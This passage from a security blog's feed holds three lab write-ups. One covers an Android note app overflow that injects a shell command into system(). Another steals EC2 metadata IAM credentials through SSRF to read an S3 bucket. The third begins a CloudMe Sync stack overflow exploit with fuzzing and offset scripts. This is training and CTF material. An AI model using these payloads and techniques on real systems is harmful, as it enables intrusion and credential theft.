+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I modified some variables name to be able to read better.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;  memcpy(buffer,&quot;Log \&quot;Note added at $(date)\&quot;&quot;,500);
+  if (get_strings == (ushort *)0x0) {
+    return_value = 0;
+  }
+  else {
+    buffer_to_store_user_input[0] = FUN_00100bf4(*get_strings &amp;amp; 0xff);
+    for (i = 1; i &amp;lt; get_string_length; i = i + 1) {
+      buffer_to_store_user_input[i] = (char)get_strings[i];
+    }
+    system(buffer);
+    buffer_to_store_user_input[i] = &apos;\0&apos;;
+    return_value = _JNIEnv::NewStringUTF(local_30,buffer_to_store_user_input);
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I noticed that &lt;code&gt;memcpy&lt;/code&gt; move this string &lt;code&gt;Log \&quot;Note added at $(date)\&lt;/code&gt; into &lt;code&gt;buffer&lt;/code&gt; variable and execute &lt;code&gt;$(date)&lt;/code&gt; using &lt;code&gt;system()&lt;/code&gt; library. This copies &lt;code&gt;500&lt;/code&gt; bytes from a string that&apos;s only &lt;code&gt;~28&lt;/code&gt; bytes long. So the other &lt;code&gt;472&lt;/code&gt; bytes will be junk.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;for (i = 1; i &amp;lt; get_string_length; i = i + 1) {
+    buffer_to_store_user_input[i] = (char)get_strings[i];
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And this code loop through all the characters that we typed into &lt;code&gt;title&lt;/code&gt; and appends them into &lt;code&gt;buffer_to_store_user_input&lt;/code&gt; variable which is only &lt;code&gt;100&lt;/code&gt; bytes long.&lt;/p&gt;
+&lt;p&gt;Our goal is to overwrite the &lt;code&gt;buffer&lt;/code&gt; variable with our malicious command so we can get code execution.&lt;/p&gt;
+&lt;p&gt;So what if we put data (junk) more than &lt;code&gt;100&lt;/code&gt; bytes, the extra data would overflow the &lt;code&gt;buffer&lt;/code&gt;?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;char buffer_to_store_user_input [100];
+char buffer [500];
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To get a better vision, I wrote a frida script to monitor system&apos;s argument from &lt;code&gt;libc&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function HookingNative(libc, sys){
+    let addr = Module.findExportByName(libc,sys);
+    Interceptor.attach(addr, {
+      onEnter: function (argv) {
+        console.log(sys,&quot;argument -&amp;gt; &quot;, argv[0].readUtf8String())
+      }
+    })
+  }
+
+HookingNative(&quot;libc.so&quot;,&quot;system&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run the frida script and just create a note like a normal.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After that, look at frida output and &lt;code&gt;Log &quot;Note added at $(date)&quot;&lt;/code&gt; is being passed as a system&apos;s argument.&lt;/p&gt;
+&lt;p&gt;Now, to check this is overflow or not, let generate &lt;code&gt;100 A&lt;/code&gt; and add &lt;code&gt;BBBBCCCC&lt;/code&gt; at the end.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shanekhantaun9@Mac notekeeper % python3 -c &apos;print(&quot;A&quot; * 100)&apos; 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Our payload will be like&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then run the frida script, inject our payload and see the output.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see our 4 &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;C&lt;/code&gt; are overwriting the value of &lt;code&gt;buffer&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now let inject linux &lt;code&gt;id&lt;/code&gt; command after hunderd &lt;code&gt;A&lt;/code&gt;. The payload will be like below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid &amp;gt; /data/data/com.mobilehackinglab.notekeeper/hacked.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Copy that payload, paste it into note.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk8.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We&apos;ve completely inject our command into &lt;code&gt;buffer&lt;/code&gt; field.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk9.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After checking the file under &lt;code&gt;/data/data/com.mobilehackinglab.notekeeper&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/nk10.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see that it successfully created a &lt;code&gt;hacked.txt&lt;/code&gt; file &lt;code&gt;id&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;That&apos;s it, you can also write frida script to inject the payload.&lt;/p&gt;
+&lt;p&gt;You will get a beautiful badge after you submitted the answer to &lt;code&gt;mobilehackinglab&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/android/notekeeper/cert.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>SSRF to S3 Bucket Compromised</title><link>https://r0x0rzx.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Description&lt;/h3&gt;
+&lt;p&gt;This challenge from &lt;a href=&quot;https://pwnedlabs.io/labs/ssrf-to-pwned&quot;&gt;pwnedlab&lt;/a&gt; is easy and beginner friendly called SSRF to Pwned.&lt;/p&gt;
+&lt;p&gt;The starting point is a single url : http://app.huge-logistics.com&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Think of S3 bucket like a folder in the cloud. We can use it to store any kind of file or data, from documents to images. It can also use to store static file for our websites. Sometimes developers are store sensitive files in s3 bucket. So it&apos;s worth to enumerate s3 bucket during cloud pentest beacuse S3 buckets are often misconfigured.&lt;/p&gt;
+&lt;h3&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;When we checked the website’s source code, we can see that the webpage stores its image files in an S3 bucket.
+&lt;img src=&quot;/images/aws/ssrf2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;huge-logistics-storage&lt;/code&gt; is the name of the bucket. When we look at the S3 bucket, we can see a couple of authentication configurations. &lt;code&gt;AuthenticatedUsers&lt;/code&gt; and &lt;code&gt;Unauthenticated(anonymous)&lt;/code&gt;. For &lt;code&gt;AuthenticatedUsers&lt;/code&gt;, access can be granted for specific IAM users/roles or to all AWS accounts.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;AuthenticatedUsers Access&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;lt;b&amp;gt; For specific IAM access&amp;lt;/b&amp;gt; which mean permissions that are granted only to particular IAM users/roles&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;lt;b&amp;gt;For any valid AWS users&amp;lt;/b&amp;gt; If a bucket policy or ACL grants permissions to this group, it means any AWS account with valid credentials can access.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Unauthenticated (Anonymous) Access&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;&amp;lt;b&amp;gt;Anyone on the internet&amp;lt;/b&amp;gt; can list or get the objects.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;AWS CLI&lt;/h3&gt;
+&lt;p&gt;We can check the by command line below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# admin_cloud6 is just my own aws account
+aws s3 ls s3://huge-logistics-storage --profile admin_cloud6
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::427648302155:user/it-admin is not authorized to perform: s3:ListBucket on resource: &quot;arn:aws:s3:::huge-logistics-storage&quot; because no identity-based policy allows the s3:ListBucket action
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For the unauthenticated request, we can use &lt;code&gt;--no-sign-request&lt;/code&gt; argument.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 ls s3://huge-logistics-storage --recursive --no-sign-request                       
+2023-06-01 05:14:05          0 backup/
+2023-06-01 05:14:47       3717 backup/cc-export2.txt
+2023-06-01 21:38:27         32 backup/flag.txt
+2023-06-01 03:40:47          0 web/
+2023-06-01 03:42:33     114886 web/images/about.jpg
+2023-06-01 03:42:34     271657 web/images/banner.jpg
+2023-06-01 03:42:35      48441 web/images/blog1.jpg
+2023-06-01 03:42:36      32805 web/images/blog2.jpg
+2023-06-01 03:42:36      44570 web/images/blog3.jpg
+2023-06-01 03:42:37      20032 web/images/executive.jpg
+2023-06-01 03:42:37      13368 web/images/manager.jpg
+2023-06-01 03:42:38      18260 web/images/manager1.jpg
+2023-06-01 03:42:38      42216 web/images/signature.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is &lt;code&gt;flag.txt&lt;/code&gt; file in backup folder. We can download it &lt;code&gt;cp&lt;/code&gt; command as follow:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --no-sign-request
+fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It give an error because we don&apos;t have enough access to download it. If we go back to the webpage, there is an endpoint called &lt;code&gt;status.php&lt;/code&gt; as follow:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.com&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Which check the status of the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Getting AWS Secret&lt;/h3&gt;
+&lt;p&gt;We can check this &lt;code&gt;SSRF&lt;/code&gt; via burp collaborator or localhost &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Or we can check &lt;code&gt;metadata&lt;/code&gt; of ec2 instance on this endpoint : &lt;code&gt;169.254.169.254/latest/meta-data/&lt;/code&gt;
+&lt;img src=&quot;/images/aws/ssrf5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;To grab the aws id and secret key, we need to check first is there any IAM role configured or not from this endpoint &lt;code&gt;169.254.169.254/latest/meta-data/iam/info&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can make a request to fetch &lt;code&gt;MetapwnedS3Access&lt;/code&gt;&apos;s secret with this url: &lt;code&gt;169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;By using this aws secret, we can configure aws credential to interact with &lt;code&gt;awscli&lt;/code&gt; as shown below&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf8.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;And then we can validate with this command. This is similar to &lt;code&gt;whoami&lt;/code&gt; command in linux.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws sts get-caller-identity --profile metapwned
+{
+    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
+    &quot;Account&quot;: &quot;104506445608&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!TIP]
+If you don&apos;t want to add &lt;code&gt;--profile&lt;/code&gt; argument every time you run a command, you can set it as a defult profile like this&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;export AWS_PROFILE=metapwned
+aws sts get-caller-identity                    
+{
+    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
+    &quot;Account&quot;: &quot;104506445608&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Compromised S3 Bucket Access&lt;/h3&gt;
+&lt;p&gt;Now that we have IAM role access, let’s try downloading the &lt;code&gt;flag.txt&lt;/code&gt; file again using this profile.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt .
+download: s3://huge-logistics-storage/backup/flag.txt to ./flag.txt
+
+cat flag.txt 
+282f08a114b4b4f2d345100dXXXXXXXX         
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This time we were able to download successfully the flag file from the compromised S3 bucket.&lt;/p&gt;
+</content:encoded></item><item><title>Win x86 Stack Based Buffer Overflow</title><link>https://r0x0rzx.github.io/posts/win32-exp/stack-base-buffer-overflow/</link><guid isPermaLink="true">https://r0x0rzx.github.io/posts/win32-exp/stack-base-buffer-overflow/</guid><pubDate>Mon, 07 Oct 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I won&apos;t talk about details in here like how the stack work or what are registers. You must have first knowledge in basic assembly language and debugger because I intended this blog for practical purpose, so I don&apos;t wanna make you bored for reading this kind of stuff. If you don&apos;t know yet how the stack work, there are plenty of good resources out there.I recommend to read it first. So Let&apos;s cut to the chase.&lt;/p&gt;
+&lt;h3&gt;What is buffer overflow?&lt;/h3&gt;
+&lt;p&gt;Buffer Overflow may happen when a program writes more data to a buffer (user inputs) beyond it can hold.
+This will lead to memory corruption which mean our buffer can overwrite some important datas of the program in memory. With this vulnerability, attacker can make the program do things it wasn&apos;t supported to do, like running malicious code. This kind of vulnerabilities may happen in programming languages like C and C++ due to their low-level memory management and lack protection. For other languages like Java has automatic memory management through the Garbage Collector. It takes care of allocating and freeing memory, reducing the risk of buffer overflows.&lt;/p&gt;
+&lt;p&gt;Think of a login form that ask us to input username and the developer set the username field with a maximum length 10 characters. But if we enter 50 or 100 characters, the extra data migth overwrite into the other parts of the program (EIP),and it will be break the program. So instead of breaking the program, we can control the &lt;code&gt;EIP&lt;/code&gt; (Instruction Pointer which hold the memory address of the next execution), we can redirect the execution of our program wherever we want. For example, redirect to our injected malicious shellcode location.&lt;/p&gt;
+&lt;h3&gt;Intro&lt;/h3&gt;
+&lt;p&gt;For the first of this series, we gonna use &lt;a href=&quot;https://www.exploit-db.com/apps/cba3235e4ac485d70544207acd415a67-CloudMe_1110.exe&quot;&gt;CloudMe Sync 1.11.0&lt;/a&gt; application to develop our exploit. This application is vulnerable to Remote Buffer Overflow on port 8888.&lt;/p&gt;
+&lt;p&gt;For the requirements, I used &lt;code&gt;windows 7&lt;/code&gt;, &lt;code&gt;Immunity Debugger&lt;/code&gt; and &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When we open the app, it will running on port 8888 in the background. We can check with &lt;code&gt;netstat -ano&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack1_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Before we get started, we need to attach our app with immunity debugger, so we can see how the application is working in the background and all the instruction. Run cloudme application first, and in immunity debugger, click on &lt;code&gt;File &amp;gt; Attach&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Fuzzing&lt;/h3&gt;
+&lt;p&gt;Now for the first step, we need to identify how many buffer the application can handle, how many buffer we need to overwrite &lt;code&gt;EIP&lt;/code&gt; or crash the application.
+let&apos;s run our fuzzing script below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def fuzz():
+    try:
+        for i in range(0,10000,500):
+            buffer = b&quot;A&quot;*i
+            print(&quot;Fuzzing %s bytes&quot; % i)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, port))
+            s.send(buffer)
+            s.close()
+    except:
+        print(&quot;Could not establish a connection&quot;)
+
+fuzz()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When we run the script, we can see that the application did not crash.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;But it was overwritten in our &lt;code&gt;EIP&lt;/code&gt; with &lt;code&gt;41414141&lt;/code&gt; which is &lt;code&gt;A&lt;/code&gt; character in hex, we can check and see in debugger. Now we know the program is vulnerable to buffer overflow.&lt;/p&gt;
+&lt;p&gt;We need to know the exact location of the buffer to overwrite &lt;code&gt;EIP&lt;/code&gt; address. So we can put the address of our shellcode location into &lt;code&gt;EIP&lt;/code&gt; and redirect the program to execute it.&lt;/p&gt;
+&lt;h3&gt;Finding the Offset&lt;/h3&gt;
+&lt;p&gt;From above scenario, we used only &lt;code&gt;AAAA&lt;/code&gt; which is repetitive data to overflow the program. The problem is that it doesn&apos;t help us to locate the exact point of overflow, as we can&apos;t distinguish one &quot;A&quot; from another in the memory dump.&lt;/p&gt;
+&lt;p&gt;So to archive this, we will use &lt;code&gt;usr/bin/msf-pattern_create -l 5000&lt;/code&gt; tool to generate non-repeating string from &lt;code&gt;msf&lt;/code&gt;.Or we can easily use online generator tool in &lt;a href=&quot;https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Update our tool with generated pattern.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python2
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def find_offset():
+    pattern = b&quot;Aa0Aa1Aa2---[snip]---u0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&quot;
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(pattern)
+    s.close()
+
+find_offset()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now restart debugger and run the script again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see that our &lt;code&gt;ESP&lt;/code&gt; is also overflow with our pattern. For now copy &lt;code&gt;EIP&lt;/code&gt; address and check with &lt;code&gt;patter_offset&lt;/code&gt; from msf.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Controlling EIP&lt;/h3&gt;
+&lt;p&gt;Now we know that we need &lt;code&gt;1052&lt;/code&gt; buffer to control &lt;code&gt;EIP&lt;/code&gt;. Let&apos;s update our code with this offset and put &lt;code&gt;BBBB&lt;/code&gt; as &lt;code&gt;EIP&lt;/code&gt; to make sure this will actually overwrite &lt;code&gt;EIP&lt;/code&gt; or not.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def find_offset():
+    junk = b&quot;A&quot; * 1052
+    eip = b&quot;BBBB&quot;
+
+    payload = junk + eip
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+find_offset()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run the script again.
+&lt;img src=&quot;/images/expdev/stack7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;See! our &lt;code&gt;EIP&lt;/code&gt; was overwritten by &lt;code&gt;42424242&lt;/code&gt; which are &lt;code&gt;BBBB&lt;/code&gt; in hex.&lt;/p&gt;
+&lt;p&gt;Now we know we can control &lt;code&gt;EIP&lt;/code&gt; address which mean we can redirect the application&apos;s execution wherever we want (not wherever xD, will see).&lt;/p&gt;
+&lt;p&gt;For pointing &lt;code&gt;EIP&lt;/code&gt; to our shellcode&apos;s location, we have to use a method called &lt;code&gt;jump + reg&lt;/code&gt;. And our shellcode is overflowing on the stack, so we can use &lt;code&gt;jmp esp&lt;/code&gt; instruction.&lt;/p&gt;
+&lt;p&gt;So, the flow will be like this, we will use &lt;code&gt;jmp esp&lt;/code&gt; to jump on this stack which will be our shellcode location and execute it.&lt;/p&gt;
+&lt;p&gt;Before we finding that instruction, we need to find bad characters.&lt;/p&gt;
+&lt;h3&gt;Finding Bad Characters&lt;/h3&gt;
+&lt;p&gt;What are bad characters actually? When we exploiting buffer overflow, we need to inject a playload like shellcode into the memory of our target program. But certain characters contain in the shellcode may break our payload like &lt;code&gt;0x00&lt;/code&gt; (null byte) or &lt;code&gt;0x0A&lt;/code&gt; (new lines) which are use to terminate the strings.&lt;/p&gt;
+&lt;p&gt;When our payload include these characters, it may not working as intended and causing the exploit fail. So how can we find bad characters?&lt;/p&gt;
+&lt;p&gt;To identify bad characters, we need to send all the possible byte values &lt;code&gt;0x00 ot 0xFF&lt;/code&gt; (like above we sent junk code) by using debugger, then check for any characters that break our payload.&lt;/p&gt;
+&lt;p&gt;So, stop talking and let&apos;s see the demostration.&lt;/p&gt;
+&lt;p&gt;We can generate bad characters byte array using &lt;code&gt;!mona bytearray&lt;/code&gt; command. It will store two file in current working directory, &lt;code&gt;bytearray.txt&lt;/code&gt; and &lt;code&gt;bytearray.bin&lt;/code&gt; . You can set mona&apos;s current working directory with this command &lt;code&gt;!mona config -set workingfolder c:\mona&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Copy all the bytes and put it into our exploit.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def find_offset():
+    bad_chars = bytes(&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;
+&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;
+&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;
+&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;
+&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;
+&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;
+&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;
+&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)
+
+    junk = b&quot;A&quot; * 1052
+    eip = b&quot;BBBB&quot;
+
+    payload = junk + eip + bad_chars
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+find_offset()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run the script again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can see our &lt;code&gt;ESP&lt;/code&gt; is overwritten by junk data, value is &lt;code&gt;0028D470&lt;/code&gt;. Right click on it and &lt;code&gt;Follow in Dump&lt;/code&gt; to see in the dump window. We can also check manually but in this case we gonna use &lt;code&gt;mona&lt;/code&gt; command which is &lt;code&gt;!mona compare -f &quot;C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin&quot; -a 0028D470&lt;/code&gt; for automate task. If we have bad charaters, it will show all in the &lt;code&gt;BadChars&lt;/code&gt; field.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In this case, we don&apos;t actually have any bad characters. Great!&lt;/p&gt;
+&lt;h3&gt;Identify JMP Instruction&lt;/h3&gt;
+&lt;p&gt;Let&apos;s continue our exploit. Now we need to identity jump instruction in the modules &lt;code&gt;dll&lt;/code&gt; or similar component &lt;code&gt;cloueme.exe&lt;/code&gt; which are lack memory protection. We can use &lt;code&gt;!mona modules&lt;/code&gt; command to accomplish this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;You can see &lt;code&gt;Qt5Core.dll&lt;/code&gt; has &lt;code&gt;False&lt;/code&gt; on every protection. We will use this one. So to find our &lt;code&gt;jmp esp&lt;/code&gt; instruction inside that &lt;code&gt;dll&lt;/code&gt;, we have to use &lt;code&gt;opcode&lt;/code&gt;. To accomplish this, we can use mfs moudule called &lt;code&gt;nasm_shell.rb&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Okay the &lt;code&gt;opcode&lt;/code&gt; for &lt;code&gt;jmp esp&lt;/code&gt; is &lt;code&gt;FF E4&lt;/code&gt;. Now let check this opcode is available or not inside our &lt;code&gt;Qt5Core.dll&lt;/code&gt; using this command &lt;code&gt;!mona find -s &quot;\xff\xe4&quot; -m Qt5Core.dll&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/expdev/stack14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Choose whatever address you want but you should avoid chosing the address that include null bytes &lt;code&gt;00&lt;/code&gt;, otherwise it may break our exploit. I will choose this address &lt;code&gt;0x68BAD568&lt;/code&gt; in this case.&lt;/p&gt;
